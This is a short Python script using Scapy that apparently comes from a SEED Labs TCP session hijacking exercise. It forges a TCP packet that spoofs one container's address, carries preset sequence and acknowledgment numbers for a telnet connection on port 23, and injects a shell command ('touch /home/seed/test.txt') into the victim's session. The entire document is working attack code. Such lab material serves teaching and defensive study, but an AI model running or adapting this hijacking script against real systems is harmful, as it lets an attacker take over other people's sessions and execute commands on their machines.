#!/usr/bin/env python3
from scapy.all import *

ip = IP(src = "10.9.0.6", dst = "10.9.0.5") # user impersonation, src = user1 to dst = victim ip address
tcp = TCP(sport = 58864, dport = 23, flags = "A", seq = 3340013418, ack = 3412673392) # corresponding s-port and d-port, seq and ack numbers
data = "\n touch /home/seed/test.txt\n" # command to run on victim container
pkt = ip/tcp/data
ls(pkt)
send(pkt, iface = "br-df6653c63eb9", verbose = 0)